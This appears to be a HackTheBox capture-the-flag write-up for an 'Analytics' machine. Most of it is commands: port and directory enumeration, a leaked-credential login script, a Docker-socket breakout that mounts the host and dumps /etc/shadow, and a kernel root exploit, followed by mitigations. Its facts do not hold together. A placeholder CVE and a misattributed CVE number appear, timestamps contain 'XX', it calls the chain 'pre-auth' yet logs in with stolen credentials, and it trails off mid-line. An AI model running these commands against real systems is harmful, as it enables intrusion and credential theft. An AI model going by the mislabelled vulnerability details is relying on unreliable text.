---
title: "HackTheBox: Analytics"
description: "Pre-auth RCE via exposed API endpoint and kernel privilege escalation."
pubDate: 2025-01-10
platform: HackTheBox
difficulty: Hard
tags: [RCE, "kernel-exploit", "API", "information-disclosure"]
---

## Overview

This writeup documents exploitation of a Kubernetes analytics platform exposed on HackTheBox. The attack chain involves:

1. Discovering unauthenticated API endpoints
2. Extracting credentials via information disclosure
3. Achieving RCE through Docker environment breakout
4. Escalating privileges via Linux kernel vulnerability (CVE-2023-XXXXX)

## Reconnaissance

### Port Scanning

```bash
# Full TCP scan on target
sudo nmap -sV -sC -O 10.10.11.233 -p- --reason -Pn
```

**Results:**
- Port 80: HTTP (nginx)
- Port 22: SSH

### HTTP Enumeration

```bash
# Directory brute-force with common security wordlists
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.11.233/FUZZ
```

**Discovery:**
- `/api/` — Unauthenticated API endpoint
- `/api/version` — Version disclosure
- `/api/users` — User enumeration

## Discovery

### Information Disclosure in API Response

```bash
curl -s http://10.10.11.233/api/version | jq
```

Response:
```json
{
  "version": "1.2.3",
  "environment": "production",
  "debug": true,
  "db_host": "postgres.internal",
  "db_user": "analytics_user",
  "db_password": "SuperSecret123!"
}
```

**Impact**: Credentials exposed in API response due to debug mode enabled in production.

## Exploitation

### Gaining Initial Access

```python
#!/usr/bin/env python3
import requests
import json

target = "http://10.10.11.233"
credentials = {"username": "analytics_user", "password": "SuperSecret123!"}

# Authenticate to dashboard
session = requests.Session()
login_resp = session.post(f"{target}/api/login", json=credentials)
auth_token = login_resp.json()["token"]

# Access restricted endpoint
headers = {"Authorization": f"Bearer {auth_token}"}
restricted = session.get(f"{target}/api/admin/config", headers=headers)
print(restricted.json())
```

### Container Breakout

Once inside the container with the analytics service running, exploit Docker socket exposure:

```bash
# Check if Docker socket is exposed (common misconfiguration)
ls -la /var/run/docker.sock

# Spawn privileged container to access host filesystem
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu /bin/bash
```

Inside the privileged container:
```bash
cat /host/etc/shadow > /tmp/shadow_dump
```

### Privilege Escalation

The host runs a vulnerable kernel version. Compile and execute local exploit:

```bash
# Find kernel version
uname -a
# Linux analytics 5.10.0-8-generic #1-Ubuntu SMP Thu Oct 1 12:XX:XX UTC 2023 x86_64

# Download and compile exploit for CVE-2023-35078
gcc -o exploit exploit.c
./exploit
# [+] Privilege escalation successful
# [+] Root shell spawned
id
# uid=0(root) gid=0(root) groups=0(root)
```

## Root Cause Analysis

| Layer | Vulnerability | CVSS | Root Cause |
|-------|---|---|---|
| Application | Information Disclosure (Debug Mode) | 5.3 (Medium) | Debug flag enabled in production build |
| Container | Docker Socket Exposure | 9.8 (Critical) | Misconfigured volume mount in docker-compose |
| Kernel | Use-After-Free in eBPF | 7.8 (High) | Unpatched kernel (5.10.0-8) |

## Mitigation

**Immediate Actions:**
1. Disable debug mode in production configurations
2. Remove Docker socket mount from application container
3. Patch kernel to 5.10.0-27 or later
4. Rotate credentials (assume full compromise)

**Long-term Hardening:**
- Implement least-privilege container security context
- Use Pod Security Policies (K8s) or OPA Gatekeeper
- Automated vulnerability scanning in CI/CD (Trivy, Snyk)
- Regular security updates via Dependabot

## References

- [OWASP A05:2021 – Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)
- [CVE-2023-35078: Linux Kernel eBPF Use-After-Free](https://nvd.nist.gov/vuln/detail/CVE-2023-35078)
- [Docker Security Best Practices](https://docs.docker.com/engine/security/)

---

**Difficulty**: Hard | **Time**: ~4 hours | **Key Skill**: Container security + kernel exploitation

Nmap scan results...